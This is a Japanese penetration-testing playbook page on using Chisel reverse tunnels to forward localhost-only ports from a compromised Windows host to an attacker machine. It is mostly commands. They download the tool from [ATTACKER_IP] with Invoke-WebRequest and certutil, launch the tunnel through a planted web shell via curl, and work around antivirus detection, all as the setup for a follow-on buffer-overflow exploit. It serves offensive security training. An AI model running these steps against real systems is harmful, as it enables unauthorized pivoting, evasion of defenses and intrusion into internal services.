# Chisel — ポートフォワーディング

> **スコープ**: Chisel（Go 製の TCP トンネリングツール）を使って、ターゲット内部でしかアクセスできないポートをテスター端末に転送する手法。ターゲット内部サービスへの攻撃（Buffer Overflow 等）の前提として使う。

## 着火条件

- `netstat` 等により**ローカルにしかリスニングしていないポート**（`127.0.0.1:[PORT]`）が見つかった
- そのサービスに直接アクセスしてエクスプロイトを実行したい
- ターゲットからテスター端末への**アウトバウンド接続が可能**（Reverse モードの前提）

**着火シグナル:** `netstat -ano | findstr ":0"` で `127.0.0.1:[PORT]` の LISTENING が見えたとき。

## 環境前提

- 実行環境: テスター端末（サーバー起動）＋ ターゲット（クライアント起動）
- 必要なツール: `chisel`（ペネトレ用 Linux ディストリ標準搭載またはほぼ標準。なければ `apt install chisel` / GitHub Release から取得）
- Windows 用バイナリ: GitHub Release から `chisel_[バージョン]_windows_amd64.gz` を取得して解凍
- オフライン環境: テスター端末でビルド済みバイナリをターゲットに転送する（`python3 -m http.server` + `IWR` 等）

## 先に確認すること

**攻撃者の思考トレース:** エクスプロイトは「接続先が `127.0.0.1:[PORT]`」を前提にしている場合が多い。Chisel のリバーストンネルを使えば、テスター端末の `127.0.0.1:[FORWARD_PORT]` に接続するだけでターゲット内部のサービスに届く。

**リバーストンネルの仕組み:**

```
テスター端末                  ターゲット
[chisel server :9999]  ←接続←  [chisel.exe client]
   ↑
[localhost:8888] → トンネル → [127.0.0.1:8888 on target]
```

---

## 1. リバーストンネルの構築

**事前準備（必須）:** Chisel バイナリをターゲットに転送しておく。

```bash
# [Attacker] Linux 用（サーバー）は標準搭載 or apt install
which chisel || sudo apt install chisel -y

# [Attacker] Windows 用バイナリを取得して解凍
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
gunzip chisel_1.10.1_windows_amd64.gz

# [Attacker] HTTP サーバーで配信
python3 -m http.server 80
# テスター側の到達可能インターフェース（環境によって変わる: ip a で確認）のIPを使う
```

```powershell
# [Target] Web シェルや既存シェルから Windows にダウンロード
Invoke-WebRequest -Uri "http://[ATTACKER_IP]/chisel_1.10.1_windows_amd64" -OutFile "C:\Users\Public\chisel.exe"
# または certutil（PowerShell が制限されている場合）
certutil -urlcache -f http://[ATTACKER_IP]/chisel_1.10.1_windows_amd64 C:\Users\Public\chisel.exe
```

**コマンド:**

```bash
# [Attacker] Step 1: リバーストンネルを受け付けるサーバーを起動
chisel server -p 9999 --reverse
# → "Listening on http://0.0.0.0:9999" が出たら準備完了
```

```powershell
# [Target] Step 2: リバーストンネルを確立
# → ターゲットの 127.0.0.1:8888 をテスター端末の localhost:8888 に転送
C:\Users\Public\chisel.exe client [ATTACKER_IP]:9999 R:8888:127.0.0.1:8888
# R:[転送先ポート]:[転送元ホスト]:[転送元ポート]
```

```bash
# [Attacker] Step 3: テスター端末からターゲット内部サービスにアクセス
# localhost:8888 に接続すればターゲットの内部サービスに届く
python3 exploit.py   # target = "127.0.0.1" のまま動く
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `server: session#1: tun: proxy#R:8888=>8888: Listening` | トンネル確立成功 | テスター端末から `localhost:8888` へ接続してエクスプロイト実行 |
| `Client version (1.10.1) differs from server version` | バージョン差異の警告 | 動作することが多いため継続。不具合があれば同バージョンに揃える |
| クライアントがサーバーに接続できない | ファイアウォールがブロック | 別ポート（80・443 等）でサーバーを起動して再試行 |

**注意:** テスター端末で既に `8888` が使われている場合は `R:8889:127.0.0.1:8888` のように転送先ポートを変える。

---

## 刺さらなかったとき

| 症状 | 原因の推定 | 次のアクション |
|------|----------|--------------|
| クライアントがサーバーに接続できない | ファイアウォールがアウトバウンドをブロック | 別ポート（80・443 等）でサーバーを起動して再試行 |
| バイナリを実行してもすぐ終了する | アンチウイルスが検知・削除 | 別のディレクトリに配置 / 別バージョンを試す |
| トンネルが確立するが通信できない | ターゲット側で対象ポートが動いていない | `netstat -ano` で再確認してポート番号を修正 |
| `chisel.exe` が実行できない（32bit 環境）| アーキテクチャ不一致 | `systeminfo` で CPU 情報を確認して 32bit 版を使用 |

---

## 注意点・落とし穴

- **AV 検知:** Windows Defender 等が chisel.exe を検知することがある。`C:\Windows\Temp`・`C:\Users\Public` 等に置いて試す
- **バージョン一致推奨:** サーバーとクライアントのバージョンは合わせておく方が安定する
- **Web シェル経由でクライアントを実行する場合、バックグラウンド実行が必要:**
  ```bash
  # レスポンスが返ってこない（トンネル維持中）ため、テスター端末のサーバー出力でトンネル確立を確認する
  curl "http://[TARGET]/upload/shell.php?cmd=C:\Users\Public\chisel.exe+client+[ATTACKER_IP]:9999+R:8888:127.0.0.1:8888"
  ```

---

## 関連技術

- 前：ローカルポートの発見（netstat）→ `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`（Step 1.5）
- 後：転送したポートへの Buffer Overflow 攻撃 → `../04_Post_Access_Windows_AD/Buffer_Overflow_LocalService.md`
